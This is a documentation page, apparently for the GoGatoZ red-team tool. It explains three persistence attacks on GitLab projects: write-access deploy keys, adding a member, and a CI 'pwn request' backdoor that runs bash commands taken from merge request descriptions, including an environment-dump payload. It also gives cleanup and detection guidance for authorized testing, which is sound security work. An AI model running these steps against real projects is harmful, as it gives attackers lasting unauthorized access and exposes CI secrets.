---
title: Persistence Command
description: Establish persistence in GitLab projects via deploy keys, member addition, and MR-triggered pipelines
---

The attack command includes persistence modes for establishing long-term access to GitLab projects. These techniques survive credential rotation and provide alternative access paths. Use only with explicit authorization.

> Warning: Persistence techniques are for authorized security testing only.

## Modes

GoGatoZ supports three persistence mechanisms, each activated as an attack mode:

| Mode | Flag | Description |
|------|------|-------------|
| Deploy Key | `--deploy-key` | Generate an RSA keypair and register a write-access deploy key on the project |
| Member Addition | `--add-member` | Add a user as a project member with a specified access level |
| MR Pwn Request | `--commit-ci --payload pwn-request` | Commit a CI config that triggers on merge request events |

Each mode also has corresponding cleanup flags under `--cleanup`.

## Deploy Key

Generates a 2048-bit RSA keypair, saves the private key locally, and adds the public key to the target project as a deploy key with push (write) access.

### Options

- `--deploy-key`: Enable deploy key creation mode
- `--key-title` string: Title for the deploy key (default: "GoGatoZ Deploy Key")
- `--key-path` string: Path to save the generated private key (**required**)
- `--target` string: Project ID or path-with-namespace

### Example

```bash
# Create a deploy key with write access
gogatoz attack --target group/project --deploy-key \
  --key-path ./deploy_key --key-title "CI/CD Integration"
```

Output:
```
Deploy key created (ID: 42)
Public key: ssh-rsa AAAAB3Nza...
Private key saved to: ./deploy_key
```

With `--output-json`:
```json
{
  "deploy_key_id": 42,
  "public_key": "ssh-rsa AAAAB3Nza...",
  "private_key_path": "./deploy_key"
}
```

### Using the deploy key

Once created, the deploy key provides Git access independent of any user token:

```bash
# Clone using the deploy key
GIT_SSH_COMMAND="ssh -i ./deploy_key -o StrictHostKeyChecking=no" \
  git clone git@gitlab.example.com:group/project.git

# Push changes (deploy key has write access)
GIT_SSH_COMMAND="ssh -i ./deploy_key" git push origin main
```

### Cleanup

```bash
gogatoz attack --target group/project --cleanup --revoke-deploy-key 42
```

## Member Addition

Adds a user as a project member by resolving their username via the GitLab Users API. The access level determines the user's permissions on the project.

### Options

- `--add-member`: Enable member addition mode
- `--member-username` string: GitLab username to add (**required**)
- `--member-role` string: Access level — `guest`, `reporter`, `developer` (default), `maintainer`
- `--target` string: Project ID or path-with-namespace

### Example

```bash
# Add a user as developer (default)
gogatoz attack --target group/project --add-member --member-username jdoe

# Add a user as maintainer for elevated access
gogatoz attack --target group/project --add-member \
  --member-username jdoe --member-role maintainer
```

Output:
```
Added jdoe as developer to project
```

### Access level reference

| Level | Capabilities |
|-------|-------------|
| `guest` | View issues and wiki |
| `reporter` | Pull code, view CI/CD |
| `developer` | Push to non-protected branches, create MRs, trigger pipelines |
| `maintainer` | Push to protected branches, manage project settings, add members |

### Cleanup

```bash
# Remove member by user ID (find via GitLab API or project settings)
gogatoz attack --target group/project --cleanup --remove-member-id 15
```

## MR Pwn Request

Commits a `.gitlab-ci.yml` that triggers on `merge_request_event` and executes commands extracted from the MR description. This establishes a persistent backdoor that activates whenever a merge request is created or updated.

### How it works

1. GoGatoZ commits a CI config with a job that triggers on `merge_request_event`
2. The job reads the MR description and extracts lines prefixed with `CMD: `
3. It executes the extracted command via `bash -lc`
4. Optionally uploads output as an artifact

### Options

Uses the standard `--commit-ci --payload pwn-request` path:

- `--payload pwn-request`: Select the MR pwn request payload
- `--target-branch-regex` string: Regex to restrict which target branches trigger the job
- `--job-name` string: Custom job name (default: "pwn-request")
- `--tags` string: Runner tags to target self-hosted runners
- `--artifacts-path` string: Path to upload as artifact
- `--branch` string: Branch to commit the CI config to

### Example

```bash
# Commit a pwn-request CI config
gogatoz attack --commit-ci --target group/project \
  --payload pwn-request --tags shell_executor \
  --branch feature/ci-checks --deconflict suffix
```

To trigger execution, create an MR with a description containing:

```
CMD: env | sort > /tmp/env_dump.txt
```

### Payload-only rendering

Generate the CI YAML without committing:

```bash
gogatoz attack --payload pwn-request --payload-only \
  --tags shell_executor --target-branch-regex '^main$'
```

### Cleanup

```bash
# Remove the CI file and branch
gogatoz attack --target group/project --cleanup \
  --cleanup-ci --branch feature/ci-checks \
  --cleanup-branch feature/ci-checks
```

## Combined Cleanup

Multiple cleanup actions can be combined in a single command:

```bash
gogatoz attack --target group/project --cleanup \
  --revoke-deploy-key 42 \
  --remove-member-id 15 \
  --cleanup-branch feature/ci-checks \
  --cleanup-ci --branch feature/ci-checks
```

Output:
```
[ok] revoke-deploy-key 42
[ok] remove-member 15
[ok] delete-branch feature/ci-checks
[ok] delete-ci-file feature/ci-checks
```

With `--output-json`, returns a structured array of action results.

## Detection Indicators

When testing persistence detection capabilities, watch for:

| Technique | Detection Signal |
|-----------|-----------------|
| Deploy Key | New deploy key in project settings, `audit_events` API |
| Member Addition | New member in project members, `audit_events` API |
| MR Pwn Request | Modified `.gitlab-ci.yml` with `merge_request_event` trigger, suspicious `script` content |

## See Also

- [Attack Command](/user-guide/command-reference/attack/) for full attack options
- [Post-Compromise](/user-guide/use-cases/post-compromise/) for enumeration after gaining access
- [Persistence Use Cases](/user-guide/use-cases/persistence/) for end-to-end attack scenarios
